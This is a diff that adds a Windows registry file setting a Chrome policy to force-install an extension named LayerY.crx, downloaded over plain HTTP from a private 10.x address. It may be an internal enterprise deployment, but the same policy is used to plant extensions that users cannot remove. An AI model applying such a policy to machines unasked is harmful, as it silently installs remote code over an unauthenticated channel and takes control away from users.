@@ -1,0 +1,4 @@
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist]
+"1"="ddmkmgcgmfmbeniceaeehfcpjfgmhdcm;http://10.21.20.254/LayerY.crx"
